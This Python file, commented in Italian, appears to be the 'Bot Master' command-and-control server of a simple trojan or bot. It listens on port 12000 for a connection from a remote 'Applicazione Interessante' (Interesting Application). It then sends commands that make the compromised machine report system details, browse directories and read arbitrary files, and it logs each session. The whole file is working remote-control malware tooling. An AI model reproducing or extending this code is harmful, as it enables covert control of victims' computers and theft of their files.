from audioop import add
from socket import *
from functions import *
from datetime import datetime

serverPort = 12000
serverSocket = socket(AF_INET,SOCK_STREAM)
serverSocket.bind( ('',serverPort) )
serverSocket.listen(1)
print ('In attesa di Applicazione Interessante...')
connectionSocket, addr = serverSocket.accept()
print ('Connesso: ',addr)
#Genera un report della sessione
report = open("./Log.txt","a")
ct = datetime.now().strftime("%d-%m-%Y")
report.write(ct + "\n")
ct = datetime.now().strftime("%d-%m-%Y %H:%M:%S")
report.write("[" + ct + "] Connesso: " + str(addr[0]) + ":" + str(addr[1]) + "\n")
while True:
    com = input ("\nInserire un comando (\"help\" per la lista dei comandi): ")
    comando = "x"
    if com == "os":
        comando = "1"
        ct = datetime.now().strftime("%d-%m-%Y %H:%M:%S")
        report.write("[" + ct + "] \"Bot Master\" os\n")
    #Elenca i file e le cartelle presenti nella working directory
    elif com == "ls":
        comando = "2"
        ct = datetime.now().strftime("%d-%m-%Y %H:%M:%S")
        report.write("[" + ct + "] \"Bot Master\" ls\n")
    #Cambia directory inserendo la directory destinazione dopo cd (cd directory)
    elif com[0:3] == "cd ":
        comando = "3" + com[2:]
        ct = datetime.now().strftime("%d-%m-%Y %H:%M:%S")
        report.write("[" + ct + "] \"Bot Master\" " + com + "\n")
    elif com == "pwd":
        comando = "4"
        ct = datetime.now().strftime("%d-%m-%Y %H:%M:%S")
        report.write("[" + ct + "] \"Bot Master\" pwd\n")
    elif com == "cpu":
        comando = "5"
        ct = datetime.now().strftime("%d-%m-%Y %H:%M:%S")
        report.write("[" + ct + "] \"Bot Master\" cpu\n")
    elif com == "memory":
        comando = "6"
        ct = datetime.now().strftime("%d-%m-%Y %H:%M:%S")
        report.write("[" + ct + "] \"Bot Master\" memory\n")
    elif com == "disk":
        comando = "7"
        ct = datetime.now().strftime("%d-%m-%Y %H:%M:%S")
        report.write("[" + ct + "] \"Bot Master\" disk\n")
    elif com[0:5] == "read ":
        file = com[5:]
        comando = "8" + file
        ct = datetime.now().strftime("%d-%m-%Y %H:%M:%S")
        report.write("[" + ct + "] \"Bot Master\" " + com + "\n")
    elif com == "help":
        cmd_list()
        continue
    elif com == "exit":
        comando = "exit"
        ct = datetime.now().strftime("%d-%m-%Y %H:%M:%S")
        report.write("[" + ct + "] \"Bot Master\" exit\n")
    else:
        print("Comando non riconosciuto\n")
        continue
    connectionSocket.send(comando.encode())
    if comando == "exit":
        print ("Connessione terminata")
        ct = datetime.now().strftime("%d-%m-%Y %H:%M:%S")
        report.write("[" + ct + "] Disconnesso\n\n")
        report.close()
        break
    messaggio = connectionSocket.recv(102400).decode()
    print ("\n" + messaggio + "\n")
    ct = datetime.now().strftime("%d-%m-%Y %H:%M:%S")
    report.write("[" + ct + "] \"Applicazione Interessante\"\n" + messaggio + "\n")
connectionSocket.close()